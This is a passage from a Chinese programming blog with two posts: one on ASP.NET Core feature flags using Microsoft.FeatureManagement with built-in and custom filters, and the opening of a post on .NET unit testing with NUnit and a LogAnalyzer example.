<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddFeatureManagement();</span><br><span class="line">    services.AddControllersWithViews();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;至此，我们的程序已经支持 <strong>Feature Flag</strong> 功能了，使用方式就简单了，这里展示一个相对简单的方式。  </p>
<p>&emsp;&emsp;首先，在 <code>appsettings.json</code> 进行配置，如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"FeatureManagement": &#123;</span><br><span class="line">  "NewFeatureFlag": true,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，在 <code>Index.cshtml</code> 通过使用 <code>feature</code> 标签来进行相应配置，示例如下所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@using Microsoft.FeatureManagement</span><br><span class="line">@inject IFeatureManager FeatureManager</span><br><span class="line">@addTagHelper *,Microsoft.FeatureManagement.AspNetCore</span><br><span class="line">@&#123;</span><br><span class="line">    ViewData["Title"] = "Home Page";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"display-4"</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">"NewFeatureFlag"</span> <span class="attr">requirement</span>=<span class="string">"All"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">asp-action</span>=<span class="string">"NewFeature"</span>&gt;</span>Go to the new feature.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">feature</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此时，我们运行起程序后就可以看到 <code>feature</code> 标签内的内容就可以渲染出来，如果我们在配置中将 <code>NewFeatureFlag</code> 值设置为 <code>False</code> 后，<code>feature</code> 标签内的内容就会消失，你可以通过查看网页源码的方式来查看具体细节。  </p>
<p>接下来笔者介绍一下微软为我们内置的两个功能开关:</p>
<ul>
<li><a href="https://github.com/microsoft/FeatureManagement-Dotnet/blob/master/src/Microsoft.FeatureManagement/FeatureFilters/PercentageFilter.cs" target="_blank" rel="noopener">PercentageFilter</a></li>
<li><a href="https://github.com/microsoft/FeatureManagement-Dotnet/blob/master/src/Microsoft.FeatureManagement/FeatureFilters/TimeWindowFilter.cs" target="_blank" rel="noopener">TimeWindowFilter</a></li>
</ul>
<h3 id="PercentageFilter"><a href="#PercentageFilter" class="headerlink" title="PercentageFilter"></a>PercentageFilter</h3><blockquote>
<p>&emsp;&emsp;PercentageFilter 是支持百分比的随机开关，通过使用这种方式，可以让一个功能在每次请求中以一个百分比概率的形式来开启/关闭。</p>
</blockquote>
<ul>
<li><p>注入功能开关 <code>Startup.cs</code></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddFeatureManagement()</span><br><span class="line">        .AddFeatureFilter&lt;PercentageFilter&gt;();</span><br><span class="line">    services.AddControllersWithViews();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置功能开关 <code>appsettings.json</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">"FeatureManagement": &#123;</span><br><span class="line">  "RandomFlag": &#123;</span><br><span class="line">    "EnabledFor": [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"Name"</span>: <span class="string">"Percentage"</span>,</span><br><span class="line">        <span class="attr">"Parameters"</span>: &#123;</span><br><span class="line">          <span class="attr">"Value"</span>: <span class="number">50</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>&emsp;&emsp;这里配置的是在每次请求时以 50% 的概率来开启该功能，其对应的配置类为：<code>PercentageFilterSettings</code></p>
</blockquote>
<ul>
<li>使用功能开关 <code>Index.cshtml</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@using Microsoft.FeatureManagement</span><br><span class="line">@inject IFeatureManager FeatureManager</span><br><span class="line">@addTagHelper *,Microsoft.FeatureManagement.AspNetCore</span><br><span class="line">@&#123;</span><br><span class="line">    ViewData["Title"] = "Home Page";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"display-4"</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">"RandomFlag"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>I am a Random Flag!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">feature</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Learn about <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://docs.microsoft.com/aspnet/core"</span>&gt;</span>building Web apps with ASP.NET Core<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;这时，当我们运行起程序后就会看到如下图所示的效果：</p>
<figure class="image-box">
                <img src="749711-20191227115408005-1996055979.gif" alt title class>
                <p></p>
            </figure>

<h3 id="TimeWindowFilter"><a href="#TimeWindowFilter" class="headerlink" title="TimeWindowFilter"></a>TimeWindowFilter</h3><blockquote>
<p>&emsp;&emsp;TimeWindowFilter 是时间段的随机开关，通过使用这种方式，可以让一个功能在指定的时间段内来开启/关闭。</p>
</blockquote>
<ul>
<li><p>注入功能开关 <code>Startup.cs</code></p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddFeatureManagement()</span><br><span class="line">        .AddFeatureFilter&lt;TimeWindowFilter&gt;();</span><br><span class="line">    services.AddControllersWithViews();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置功能开关 <code>appsettings.json</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">"FeatureManagement": &#123;</span><br><span class="line">  "RandomFlag": &#123;</span><br><span class="line">    "EnabledFor": [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"Name"</span>: <span class="string">"Percentage"</span>,</span><br><span class="line">        <span class="attr">"Parameters"</span>: &#123;</span><br><span class="line">          <span class="attr">"Start"</span>: <span class="string">"2019/12/27 5:04:00 +00:00"</span>,</span><br><span class="line">          <span class="attr">"End"</span>: <span class="string">"2019/12/27 5:04:05 +00:00"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>&emsp;&emsp;这里需要注意的是，配置里面的 <code>Start</code> 和 <code>End</code> 是 <code>DateTimeOffset</code> 类型，并且需要配置为 UTC 的时间，所以在实际使用过程中需要考虑时区问题（你可以通过调用 <code>DateTimeOffset.UtcNow</code> 的方式来获取相应时间的格式）。其对应的配置类为：<code>TimeWindowFilterSettings</code></p>
</blockquote>
<ul>
<li>使用功能开关 <code>Index.cshtml</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@using Microsoft.FeatureManagement</span><br><span class="line">@inject IFeatureManager FeatureManager</span><br><span class="line">@addTagHelper *,Microsoft.FeatureManagement.AspNetCore</span><br><span class="line">@&#123;</span><br><span class="line">    ViewData["Title"] = "Home Page";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"display-4"</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">"TimedFlag"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>I am a Timed Flag!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">feature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>@DateTimeOffset.UtcNow.ToString()<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Learn about <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://docs.microsoft.com/aspnet/core"</span>&gt;</span>building Web apps with ASP.NET Core<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;这时，当我们运行起程序后就会看到如下图所示的效果：</p>
<figure class="image-box">
                <img src="749711-20191227130433893-1810361319.gif" alt title class>
                <p></p>
            </figure>

<h2 id="自定义功能开关"><a href="#自定义功能开关" class="headerlink" title="自定义功能开关"></a>自定义功能开关</h2><p>&emsp;&emsp;最后要介绍的是如果创建和使用自定义的功能开关，笔者这里做一个这样的示例，当网站被 Microsoft Edge 浏览器访问时，显示功能，其余浏览器则隐藏功能。  </p>
<p>&emsp;&emsp;这里，笔者创建一个配置的映射类 <code>BrowserFilterSettings</code> 和执行过滤的操作类 <code>BrowserFeatureFilter</code>，示例代码如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BrowserFilterSettings</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span>[] AllowedBrowsers &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">FilterAlias(<span class="meta-string">"BrowserFilter"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">BrowserFeatureFilter</span> : <span class="title">IFeatureFilter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IHttpContextAccessor _httpContextAccessor;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BrowserFeatureFilter</span>(<span class="params">IHttpContextAccessor httpContextAccessor</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _httpContextAccessor = httpContextAccessor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Task&lt;<span class="keyword">bool</span>&gt; <span class="title">EvaluateAsync</span>(<span class="params">FeatureFilterEvaluationContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> userAgent = _httpContextAccessor.HttpContext.Request.Headers[<span class="string">"User-Agent"</span>].ToString();</span><br><span class="line">        <span class="keyword">var</span> settings = context.Parameters.Get&lt;BrowserFilterSettings&gt;();</span><br><span class="line">        <span class="keyword">return</span> Task.FromResult(settings.AllowedBrowsers.Any(userAgent.Contains));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接着，进行功能开关的注入，示例代码如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddHttpContextAccessor();</span><br><span class="line">    services.AddFeatureManagement()</span><br><span class="line">        .AddFeatureFilter&lt;BrowserFeatureFilter&gt;();</span><br><span class="line">    services.AddControllersWithViews();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，进行功能开关的配置，示例配置如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">"FeatureManagement": &#123;</span><br><span class="line">  "BrowserFlag": &#123;</span><br><span class="line">    "EnabledFor": [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"Name"</span>: <span class="string">"BrowserFilter"</span>,</span><br><span class="line">        <span class="attr">"Parameters"</span>: &#123;</span><br><span class="line">          <span class="attr">"AllowedBrowsers"</span>: [</span><br><span class="line">            <span class="string">"Edge"</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;接着，使用方式如下所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@using Microsoft.FeatureManagement</span><br><span class="line">@inject IFeatureManager FeatureManager</span><br><span class="line">@addTagHelper *,Microsoft.FeatureManagement.AspNetCore</span><br><span class="line">@&#123;</span><br><span class="line">    ViewData["Title"] = "Home Page";</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"display-4"</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">feature</span> <span class="attr">name</span>=<span class="string">"BrowserFlag"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>I am a Browser Flag only on Edge!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">feature</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Learn about <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://docs.microsoft.com/aspnet/core"</span>&gt;</span>building Web apps with ASP.NET Core<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时，当我们分别用 Microsoft Edge 和 Google Chrome 访问站点时就会看到如下图所示的效果：</p>
<figure class="image-box">
                <img src="749711-20191227133538599-1569883719.png" alt title class>
                <p></p>
            </figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp;借助于 <code>Microsoft.FeatureManagement.AspNetCore</code> 扩展包，我们可以很容易实现 <strong>Feature Flag</strong> 效果。又由于这种实现是基于 <code>IConfiguration</code> 的，所以很具有通用性。这里列出官方给出的优点：</p>
<ul>
<li>A common convention for feature management</li>
<li>Low barrier-to-entry <ul>
<li>Built on IConfiguration</li>
<li>Supports JSON file feature flag setup</li>
</ul>
</li>
<li>Feature Flag lifetime management <ul>
<li>Configuration values can change in real-time, feature flags can be consistent across the entire request</li>
</ul>
</li>
<li>Simple to Complex Scenarios Covered <ul>
<li>Toggle on/off features through declarative configuration file</li>
<li>Dynamically evaluate state of feature based on call to server</li>
<li>API extensions for ASP.NET Core and MVC framework</li>
<li>Routing</li>
<li>Filters</li>
<li>Action Attributes</li>
</ul>
</li>
</ul>
<p>&emsp;&emsp;非常感谢你能阅读这篇文章，希望它能对你有所帮助。</p>
<h1 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h1><ul>
<li><a href="https://github.com/microsoft/FeatureManagement-Dotnet" target="_blank" rel="noopener">FeatureManagement-Dotnet</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/api/microsoft.featuremanagement?view=azure-dotnet-preview" target="_blank" rel="noopener">Microsoft.FeatureManagement</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/azure-app-configuration/use-feature-flags-dotnet-core" target="_blank" rel="noopener">Tutorial: Use feature flags in an ASP.NET Core app</a></li>
<li><a href="https://www.youtube.com/watch?v=iTm5WVvNjWc" target="_blank" rel="noopener">Using custom Feature Flag filters in .NET Core</a></li>
</ul>
<blockquote>
<p>&emsp;&emsp;示例代码仅供参考，如果在前后端分离的框架中使用，需要想一些额外的方法。<br>&emsp;&emsp;例如：微软文档中是这么说的：后台代码应预先做代码检测。<br>&emsp;&emsp;同理，前端也可以用。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (featureManager.IsEnabled(<span class="keyword">nameof</span>(MyFeatureFlags.FeatureA)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Run the following code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[.NET 单元测试的艺术]]></title>
      <url>/2020/01/03/ArtOfUnitTest/</url>
      <content type="html"><![CDATA[<blockquote>
<p>入门：<a href="https://www.cnblogs.com/edisonchou/p/5437205.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/5437205.html</a><br>核心技术：<a href="https://www.cnblogs.com/edisonchou/p/5447812.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/5447812.html</a><br>测试代码：<a href="https://www.cnblogs.com/edisonchou/p/5467573.html" target="_blank" rel="noopener">https://www.cnblogs.com/edisonchou/p/5467573.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h1><p>&emsp;&emsp;本篇作为入门，介绍了单元测试的基础知识，例如：如何使用一个测试框架，基本的自动化测试属性等等，还有对应的三种测试类型。</p>
<h2 id="单元测试基础"><a href="#单元测试基础" class="headerlink" title="单元测试基础"></a>单元测试基础</h2><h3 id="什么是单元测试"><a href="#什么是单元测试" class="headerlink" title="什么是单元测试"></a>什么是单元测试</h3><p>&emsp;&emsp;一个单元测试是一段<strong>自动化的代码</strong>，这段代码<strong>调用被测试的工作单元</strong>，之后对这个单元的单个最终结果的某些假设进行检验。<br>&emsp;&emsp;单元测试几乎都是用单元测试框架编写的。单元测试容易编写，能够快速运行。单元测试可靠、可读，并且可维护。<br>&emsp;&emsp;只要产品代码不发生变化，单元测试的结果是稳定的。</p>
<h3 id="与集成测试的区别"><a href="#与集成测试的区别" class="headerlink" title="与集成测试的区别"></a>与集成测试的区别</h3><figure class="image-box">
                <img src="381412-20160427000815048-1809458915.jpg" alt title class>
                <p></p>
            </figure>

<blockquote>
<p>&emsp;&emsp;集成测试是对一个工作单元进行的测试，这个测试对被测试的工作单元没有完全的控制，并使用该单元的一个或多个真实依赖物，例如时间、网络、数据库、线程或随机数产生器等。</p>
</blockquote>
<p>&emsp;&emsp;总的来说，<strong>集成测试会使用真实依赖物，而单元测试则把被测试单元和其依赖物隔离开，以保证单元测试结果高度稳定</strong>，还可以轻易控制和模拟被测试单元行为的任何方面。</p>
<h2 id="测试驱动开发基础"><a href="#测试驱动开发基础" class="headerlink" title="测试驱动开发基础"></a>测试驱动开发基础</h2><h3 id="传统的单元测试流程"><a href="#传统的单元测试流程" class="headerlink" title="传统的单元测试流程"></a>传统的单元测试流程</h3><figure class="image-box">
                <img src="381412-20160427001938142-1688215773.png" alt title class>
                <p></p>
            </figure>

<h3 id="测试驱动开发的概要流程"><a href="#测试驱动开发的概要流程" class="headerlink" title="测试驱动开发的概要流程"></a>测试驱动开发的概要流程</h3><figure class="image-box">
                <img src="123.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如上图所示，TDD 和传统开发方式不同，我们首先会编写一个会失败的测试，然后创建产品代码，并确保这个测试通过，接下来就是重构代码或者创建另一个会失败的测试。</p>
<h2 id="第一个单元测试"><a href="#第一个单元测试" class="headerlink" title="第一个单元测试"></a>第一个单元测试</h2><h3 id="NUnit-单元测试框架"><a href="#NUnit-单元测试框架" class="headerlink" title="NUnit 单元测试框架"></a>NUnit 单元测试框架</h3><p>&emsp;&emsp;NUnit 是从流行的 Java 单元测试框架 JUnit 直接移植过来的，之后 NUnit 在设计和可用性上做了极大地改进，和 JUnit 有了很大的区别，给日新月异的测试框架生态系统注入了新的活力。  </p>
<p>&emsp;&emsp;作为一名 .NET 程序员，如何在 VS 中安装 NUnit 并能够在 VS 中直接运行测试呢？  </p>
<p>&emsp;&emsp;<strong><em>Step1.</em></strong> 在 NuGet 中找到 NUnit 并安装</p>
<figure class="image-box">
                <img src="381412-20160428001258283-1124221592.jpg" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong><em>Step2.</em></strong> 在 NuGet 中找到 NUnit Test Adapter 并安装</p>
<figure class="image-box">
                <img src="381412-20160428001345095-1453299421.jpg" alt title class>
                <p></p>
            </figure>

<h3 id="LogAn-项目介绍"><a href="#LogAn-项目介绍" class="headerlink" title="LogAn 项目介绍"></a>LogAn 项目介绍</h3><p>LogAn（Log And Notificaition）<br>&emsp;&emsp;场景：公司有很多内部产品，用于在客户场地监控公司的应用程序。所有这些监控产品都会写日志文件，日志文件存放在一个特定的目录中。日志文件的格式是你们公司自己制定的，无法用现有的第三方软件进行解析。你的任务是：实现一个产品，对这些日志文件进行分析，在其中搜索特定的情况和事件，这个产品就是 LogAn。找到特定的情况和事件后，这个产品应该通知相关的人员。  </p>
<p>&emsp;&emsp;在本次的单元测试实践中，我们会一步一步编写测试来验证 LogAn 的解析、事件识别以及通知功能。首先，我们需要了解使用 NUnit 来编写单元测试。</p>
<h3 id="编写第一个测试"><a href="#编写第一个测试" class="headerlink" title="编写第一个测试"></a>编写第一个测试</h3><p>（1）我们的测试从以下这个 LogAnalyzer 类开始，这个类暂时只有一个方法 IsValidLogFileName：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogAnalyzer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">IsValidLogFileName</span>(<span class="params"><span class="keyword">string</span> fileName</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileName.EndsWith(<span class="string">".SLF"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个方法检查文件扩展名，据此判断一个文件是不是有效的日志文件。<br>&emsp;&emsp;这里在 if 中故意去掉了一个<code>!</code>运算符，因此这个方法就包含了一个 Bug —— 当文件名以 .SLF 结尾时会返回 false，而不是返回 true。这样，我们就能看到测试失败时在测试运行期中显示什么内容。  </p>
<p>（2）新建一个类库项目，命名为 Manulife.LogAn.UnitTests（被测试项目项目名为 Manulife.LogAn.Lib）。添加一个类，取名为 LogAnalyzerTests.cs。  </p>
<p>（3）在 LogAnalyzerTests 类中新增一个测试方法，取名为 IsValidFileName_BadExtension_ReturnsFalse()。  </p>
<p>&emsp;&emsp;首先，我们要明确如何编写测试代码，一般来说，一个单元测试通常包含三个行为：</p>
<figure class="image-box">
                <img src="381412-20160428003304814-1962400302.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;因此，根据以上三个行为，我们可以编写出以下的测试方法：（其中断言部分使用了 NUnit 框架提供的<code>Assert</code>类）</p>
